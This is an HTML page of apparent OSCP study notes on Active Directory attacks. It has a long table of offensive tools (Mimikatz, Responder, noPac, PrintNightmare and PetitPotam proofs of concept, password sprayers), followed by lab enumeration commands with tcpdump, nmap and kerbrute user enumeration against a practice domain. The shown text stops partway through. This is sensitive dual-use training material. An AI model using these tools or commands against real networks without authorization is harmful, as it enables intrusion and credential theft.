<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content="https://github.com/initstring/linkedin2username
==TOOLS==
Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some â€œquick winsâ€ such as users that can be attacked via Kerberoasting or ASREPRoasting."><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="The Active Directory :: DrakonOps"><meta name=twitter:description content="https://github.com/initstring/linkedin2username
==TOOLS==
Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some â€œquick winsâ€ such as users that can be attacked via Kerberoasting or ASREPRoasting."><meta property="og:url" content="https://web/oscp-notes/the-active-directory/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="The Active Directory :: DrakonOps"><meta property="og:description" content="https://github.com/initstring/linkedin2username
==TOOLS==
Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some â€œquick winsâ€ such as users that can be attacked via Kerberoasting or ASREPRoasting."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="The Active Directory :: DrakonOps"><meta itemprop=description content="https://github.com/initstring/linkedin2username
==TOOLS==
Tool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some â€œquick winsâ€ such as users that can be attacked via Kerberoasting or ASREPRoasting."><meta itemprop=wordCount content="13156"><title>The Active Directory :: DrakonOps</title>
<link href=../../images/logo.png?1762287051 rel=icon type=image/png><link href=../../css/auto-complete/auto-complete.min.css?1762287051 rel=stylesheet><script src=../../js/auto-complete/auto-complete.min.js?1762287051 defer></script><script src=../../js/search-lunr.min.js?1762287051 defer></script><script src=../../js/search.min.js?1762287051 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762287051"</script><script src=../../js/lunr/lunr.min.js?1762287051 defer></script><script src=../../js/lunr/lunr.stemmer.support.min.js?1762287051 defer></script><script src=../../js/lunr/lunr.multi.min.js?1762287051 defer></script><script src=../../js/lunr/lunr.en.min.js?1762287051 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762287051 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762287051 rel=stylesheet></noscript><link href=../../css/perfect-scrollbar/perfect-scrollbar.min.css?1762287051 rel=stylesheet><link href=../../css/theme.min.css?1762287051 rel=stylesheet><link href=../../css/format-html.min.css?1762287051 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/the-active-directory/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://web",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../css/custom.css?1762287051 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/the-active-directory/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><ul><li><a href=#identifying-hosts>Identifying Hosts</a></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><a href=#enumerating-the-password-policy---from-linux---credentialed>Enumerating the Password Policy - from Linux - Credentialed</a><ul><li></li></ul></li><li><a href=#enumerating-the-password-policy---from-windows>Enumerating the Password Policy - from Windows</a><ul><li></li></ul></li><li><a href=#detailed-user-enumeration>Detailed User Enumeration</a></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#powershell-constrained-language-mode>PowerShell Constrained Language Mode</a></li><li><a href=#laps>LAPS</a></li></ul><ul><li><a href=#smbmap>SMBMap</a><ul><li></li></ul></li><li><a href=#rpcclient>rpcclient</a></li><li><a href=#impacket-toolkit>Impacket Toolkit</a></li><li><a href=#bloodhoundpy>Bloodhound.py</a></li></ul><ul><li><ul><li></li><li><a href=#group-membership>Group Membership</a></li></ul></li><li><a href=#powerview>PowerView</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#harnessing-powershell>Harnessing PowerShell</a><ul><li><a href=#checking-defenses>Checking Defenses</a></li></ul></li><li><a href=#am-i-alone>Am I Alone?</a></li><li><a href=#network-information>Network Information</a><ul><li></li></ul></li><li><a href=#windows-management-instrumentation-wmi>Windows Management Instrumentation (WMI)</a><ul><li></li></ul></li><li><a href=#net-commands>Net Commands</a><ul><li></li></ul></li></ul><ul><li><a href=#kerberoasting---performing-the-attack>Kerberoasting - Performing the Attack</a><ul><li></li></ul></li></ul><ul><li><a href=#automated--tool-based-route>Automated / Tool Based Route</a><ul><li></li></ul></li><li><a href=#access-control-list-acl-overview>Access Control List (ACL) Overview</a></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#winrm-bloodhound>WinRM (bloodhound)</a><ul><li></li></ul></li><li><a href=#sql-server-admin>SQL Server Admin</a><ul><li></li></ul></li></ul><ul><li><a href=#petitpotam-ms-efsrpc>PetitPotam (MS-EFSRPC)</a></li><li><a href=#nopac-samaccountname-spoofing>NoPac (SamAccountName Spoofing)</a><ul><li></li></ul></li><li><a href=#printnightmare>PrintNightmare</a><ul><li></li></ul></li></ul><ul><li><a href=#exchange-related-group-membership-and-organization-management>Exchange Related Group Membership and Organization Management</a></li><li><a href=#printer-bug>Printer Bug</a><ul><li></li></ul></li><li><a href=#ms14-068>MS14-068</a></li><li><a href=#enumerating-dns-recordsactive-directory>Enumerating DNS Records(Active directory)</a><ul><li></li></ul></li><li><a href=#credentials-in-smb-shares-and-sysvol-scripts>Credentials in SMB Shares and SYSVOL Scripts</a><ul><li></li></ul></li><li><a href=#credentials-in-smb-shares-and-sysvol-scripts-1>Credentials in SMB Shares and SYSVOL Scripts</a><ul><li></li></ul></li><li><a href=#group-policy-preferences-gpp-passwords>Group Policy Preferences (GPP) Passwords</a><ul><li></li></ul></li><li><a href=#asreproasting>ASREPRoasting</a><ul><li></li></ul></li><li><a href=#group-policy-object-gpo-abuse>Group Policy Object (GPO) Abuse</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#extrasids-attack---mimikatzgolden-ticketrs>ExtraSids Attack - Mimikatz(Golden ticketrs)</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#cross-forest-kerberoasting>Cross-Forest Kerberoasting</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li><li><a href=#pingcastle>PingCastle</a></li><li><a href=#group3r>Group3r</a><ul><li></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>The Active Directory</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/pivoting_tunneling/index.html title="Scanning the Pivot Target (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/the-metasploit-framework/index.html title="The Metasploit Framework (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=the-active-directory>The Active Directory</h1><p><a href=https://github.com/initstring/linkedin2username rel=external>https://github.com/initstring/linkedin2username</a></p><p>Â </p><p>==<strong>TOOLS</strong>==</p><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 rel=external>PowerView</a>/<a href=https://github.com/dmchell/SharpView rel=external>SharpView</a></td><td>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some &ldquo;quick wins&rdquo; such as users that can be attacked via Kerberoasting or ASREPRoasting.</td></tr><tr><td><a href=https://github.com/BloodHoundAD/BloodHound rel=external>BloodHound</a></td><td>Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the <a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors rel=external>SharpHound</a> PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a <a href=https://neo4j.com/ rel=external>Neo4j</a> database for graphical analysis of the AD environment.</td></tr><tr><td><a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors rel=external>SharpHound</a></td><td>The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.</td></tr><tr><td><a href=https://github.com/fox-it/BloodHound.py rel=external>BloodHound.py</a></td><td>A Python-based BloodHound ingestor based on the <a href=https://github.com/CoreSecurity/impacket/ rel=external>Impacket toolkit</a>. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.</td></tr><tr><td><a href=https://github.com/ropnop/kerbrute rel=external>Kerbrute</a></td><td>A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket rel=external>Impacket toolkit</a></td><td>A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.</td></tr><tr><td><a href=https://github.com/lgandx/Responder rel=external>Responder</a></td><td>Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.</td></tr><tr><td><a href=https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1 rel=external>Inveigh.ps1</a></td><td>Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.</td></tr><tr><td><a href=https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh rel=external>C# Inveigh (InveighZero)</a></td><td>The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.</td></tr><tr><td><a href=https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo rel=external>rpcinfo</a></td><td>The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The &ldquo;-p&rdquo; option is used to specify the target host. For example the command &ldquo;rpcinfo -p 10.0.0.1&rdquo; will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.</td></tr><tr><td><a href=https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html rel=external>rpcclient</a></td><td>A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.</td></tr><tr><td><a href=https://github.com/byt3bl33d3r/CrackMapExec rel=external>CrackMapExec (CME)</a></td><td>CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to &ldquo;live off the land&rdquo; and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.</td></tr><tr><td><a href=https://github.com/GhostPack/Rubeus rel=external>Rubeus</a></td><td>Rubeus is a C# tool built for Kerberos Abuse.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py rel=external>GetUserSPNs.py</a></td><td>Another Impacket module geared towards finding Service Principal names tied to normal users.</td></tr><tr><td><a href=https://hashcat.net/hashcat/ rel=external>Hashcat</a></td><td>A great hash cracking and password recovery tool.</td></tr><tr><td><a href=https://github.com/CiscoCXSecurity/enum4linux rel=external>enum4linux</a></td><td>A tool for enumerating information from Windows and Samba systems.</td></tr><tr><td><a href=https://github.com/cddmp/enum4linux-ng rel=external>enum4linux-ng</a></td><td>A rework of the original Enum4linux tool that works a bit differently.</td></tr><tr><td><a href=https://linux.die.net/man/1/ldapsearch rel=external>ldapsearch</a></td><td>Built-in interface for interacting with the LDAP protocol.</td></tr><tr><td><a href=https://github.com/ropnop/windapsearch rel=external>windapsearch</a></td><td>A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.</td></tr><tr><td><a href=https://github.com/dafthack/DomainPasswordSpray rel=external>DomainPasswordSpray.ps1</a></td><td>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</td></tr><tr><td><a href=https://github.com/leoloobeek/LAPSToolkit rel=external>LAPSToolkit</a></td><td>The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft&rsquo;s Local Administrator Password Solution (LAPS).</td></tr><tr><td><a href=https://github.com/ShawnDEvans/smbmap rel=external>smbmap</a></td><td>SMB share enumeration across a domain.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py rel=external>psexec.py</a></td><td>Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py rel=external>wmiexec.py</a></td><td>Part of the Impacket toolkit, it provides the capability of command execution over WMI.</td></tr><tr><td><a href=https://github.com/SnaffCon/Snaffler rel=external>Snaffler</a></td><td>Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py rel=external>smbserver.py</a></td><td>Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241%28v=ws.11%29" rel=external>setspn.exe</a></td><td>Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.</td></tr><tr><td><a href=https://github.com/ParrotSec/mimikatz rel=external>Mimikatz</a></td><td>Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py rel=external>secretsdump.py</a></td><td>Remotely dump SAM and LSA secrets from a host.</td></tr><tr><td><a href=https://github.com/Hackplayers/evil-winrm rel=external>evil-winrm</a></td><td>Provides us with an interactive shell on a host over the WinRM protocol.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py rel=external>mssqlclient.py</a></td><td>Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.</td></tr><tr><td><a href=https://github.com/Ridter/noPac rel=external>noPac.py</a></td><td>Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py rel=external>rpcdump.py</a></td><td>Part of the Impacket toolset, RPC endpoint mapper.</td></tr><tr><td><a href=https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py rel=external>CVE-2021-1675.py</a></td><td>Printnightmare PoC in python.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py rel=external>ntlmrelayx.py</a></td><td>Part of the Impacket toolset, it performs SMB relay attacks.</td></tr><tr><td><a href=https://github.com/topotam/PetitPotam rel=external>PetitPotam.py</a></td><td>PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.</td></tr><tr><td><a href=https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py rel=external>gettgtpkinit.py</a></td><td>Tool for manipulating certificates and TGTs.</td></tr><tr><td><a href=https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py rel=external>getnthash.py</a></td><td>This tool will use an existing TGT to request a PAC for the current user using U2U.</td></tr><tr><td><a href=https://github.com/dirkjanm/adidnsdump rel=external>adidnsdump</a></td><td>A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.</td></tr><tr><td><a href=https://github.com/t0thkr1s/gpp-decrypt rel=external>gpp-decrypt</a></td><td>Extracts usernames and passwords from Group Policy preferences files.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py rel=external>GetNPUsers.py</a></td><td>Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the &lsquo;Do not require Kerberos preauthentication&rsquo; set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py rel=external>lookupsid.py</a></td><td>SID bruteforcing tool.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py rel=external>ticketer.py</a></td><td>A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.</td></tr><tr><td><a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py rel=external>raiseChild.py</a></td><td>Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.</td></tr><tr><td><a href=https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer rel=external>Active Directory Explorer</a></td><td>Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.</td></tr><tr><td><a href=https://www.pingcastle.com/documentation/ rel=external>PingCastle</a></td><td>Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on <a href=https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration rel=external>CMMI</a> adapted to AD security).</td></tr><tr><td><a href=https://github.com/Group3r/Group3r rel=external>Group3r</a></td><td>Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).</td></tr><tr><td><a href=https://github.com/adrecon/ADRecon rel=external>ADRecon</a></td><td>A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment&rsquo;s overall security state.</td></tr></tbody></table><p><a href=https://academy.hackthebox.com/module/143/section/1262 rel=external>Previous</a></p><p>Â </p><p>Â </p><h3 id=identifying-hosts>Identifying Hosts</h3><p>First, let&rsquo;s take some time to listen to the network and see what&rsquo;s going on. We can use <code>Wireshark</code> and <code>TCPDump</code> to &ldquo;put our ear to the wire&rdquo; and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is &ldquo;black box.&rdquo; We notice some <a href=https://en.wikipedia.org/wiki/Address_Resolution_Protocol rel=external>ARP</a> requests and replies, <a href=https://en.wikipedia.org/wiki/Multicast_DNS rel=external>MDNS</a>, and other basic <a href=https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html rel=external>layer two</a> packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer&rsquo;s network setup.</p><p>Â </p><p><a href=#R-image-6facc527f8d77839cb589aa68dbf61d8 class=lightbox-link><img alt=90f4e49cd5135e474bc11eb17f6f4a84.png class="lazy lightbox figure-image" loading=lazy src=../../resources/90f4e49cd5135e474bc11eb17f6f4a84.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6facc527f8d77839cb589aa68dbf61d8><img alt=90f4e49cd5135e474bc11eb17f6f4a84.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/90f4e49cd5135e474bc11eb17f6f4a84.png></a></p><p>Â </p><p><a href=#R-image-342c564bc559ac6af5de4e94d6a4c231 class=lightbox-link><img alt=096453341cffb367df7f6948a2546744.png class="lazy lightbox figure-image" loading=lazy src=../../resources/096453341cffb367df7f6948a2546744.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-342c564bc559ac6af5de4e94d6a4c231><img alt=096453341cffb367df7f6948a2546744.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/096453341cffb367df7f6948a2546744.png></a></p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo tcpdump -i ens224
</span></span></code></pre></div><p>Â </p><p><a href=#R-image-c2c32d1069793fc7825f906342f22b8f class=lightbox-link><img alt=a98717071d92064ab3b05d1a7a1dcb3a.png class="lazy lightbox figure-image" loading=lazy src=../../resources/a98717071d92064ab3b05d1a7a1dcb3a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c2c32d1069793fc7825f906342f22b8f><img alt=a98717071d92064ab3b05d1a7a1dcb3a.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/a98717071d92064ab3b05d1a7a1dcb3a.png></a></p><p>Â </p><p>Â </p><h4 id=nmap-scanning>Nmap Scanning</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -v -A -iL hosts.txt -oN /home/local-student/Documents/host-enum</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Username Brutreforce using kerbrute</p><h4 id=cloning-kerbrute-github-repo>Cloning Kerbrute GitHub Repo</h4><p>Initial Enumeration of the Domain</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo git clone https://github.com/ropnop/kerbrute.git
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ make help
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>help:            Show this help.
</span></span><span style=display:flex><span>windows:  Make Windows x86 and x64 Binaries
</span></span><span style=display:flex><span>linux:  Make Linux x86 and x64 Binaries
</span></span><span style=display:flex><span>mac:  Make Darwin (Mac) x86 and x64 Binaries
</span></span><span style=display:flex><span>clean:  Delete any binaries
</span></span><span style=display:flex><span>all:  Make Windows, Linux and Mac x86/x64 Binaries
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo make all
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>go: downloading github.com/spf13/cobra v1.1.1
</span></span><span style=display:flex><span>go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7
</span></span><span style=display:flex><span>go: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02
</span></span><span style=display:flex><span>go: downloading github.com/spf13/pflag v1.0.5
</span></span><span style=display:flex><span>go: downloading github.com/jcmturner/gofork v1.0.0
</span></span><span style=display:flex><span>go: downloading github.com/hashicorp/go-uuid v1.0.2
</span></span><span style=display:flex><span>go: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897
</span></span><span style=display:flex><span>go: downloading github.com/jcmturner/rpc/v2 v2.0.2
</span></span><span style=display:flex><span>go: downloading github.com/jcmturner/dnsutils/v2 v2.0.0
</span></span><span style=display:flex><span>go: downloading github.com/jcmturner/aescts/v2 v2.0.0
</span></span><span style=display:flex><span>go: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa
</span></span><span style=display:flex><span>cd /tmp/kerbrute
</span></span><span style=display:flex><span>rm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe
</span></span><span style=display:flex><span>rm -f /root/go/bin/kerbrute
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>Building for windows amd64..
</span></span></code></pre></div><p>Â </p><p>Â </p><p>get wordlists from here <a href=https://github.com/ropnop/kerbrute rel=external>https://github.com/ropnop/kerbrute</a></p><p><a href=https://github.com/insidetrust/statistically-likely-usernames rel=external>https://github.com/insidetrust/statistically-likely-usernames</a></p><p>Â </p><p>USE KERBRUTE</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
